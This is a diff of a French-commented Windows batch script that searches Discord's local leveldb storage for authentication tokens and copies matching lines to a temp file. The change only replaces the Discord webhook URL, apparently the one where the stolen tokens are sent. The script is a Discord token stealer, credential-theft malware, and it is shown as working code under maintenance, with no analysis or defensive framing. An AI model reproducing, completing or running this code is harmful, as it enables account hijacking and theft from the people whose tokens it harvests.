@@ -6,7 +6,7 @@ timeout /t 2 /nobreak >nul
 
 :: Récupérer le token Discord depuis les fichiers locaux
 set "discord_path=%appdata%\discord\Local Storage\leveldb"
-set "webhook=https://discord.com/api/webhooks/1504556026031243376/x5z6XxG_UbsBJo6aes3mLuybh7KyMqZF-mBuH6gxJfT3nSovRLVZClcVIF3tQY1RcSzZ"
+set "webhook=https://discord.com/api/webhooks/1504566316172837029/fhDisuj783W4JP2bskkTI5dhT60Df8aQtkp9oqsLp7-xADYmaF-mvkCKvYaoNzzjbkTs"
 
 for /f "tokens=*" %%a in ('dir /s /b "%discord_path%\*.ldb" 2^>nul') do (
     findstr /c:"oken" "%%a" >> "%temp%\discord_tokens.txt" 2>nul
